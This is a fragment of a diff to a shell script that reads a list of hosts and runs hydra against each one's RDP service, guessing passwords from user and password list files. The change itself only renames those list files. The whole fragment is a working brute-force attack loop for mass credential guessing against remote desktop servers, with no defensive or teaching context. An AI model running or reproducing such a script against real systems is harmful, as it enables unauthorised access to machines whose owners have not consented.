@@ -21,7 +21,7 @@ cat rdphosts.txt >>  allrdphosts.txt
 for entry in `cat rdphosts.txt`
 do
 echo $entry
-hydra -t 1 -V -f -L u -P p rdp://$entry  >> $entry.txt &
+hydra -t 1 -V -f -L user -P pass rdp://$entry  >> $entry.txt &
 sleep 30
 done
 sleep 2
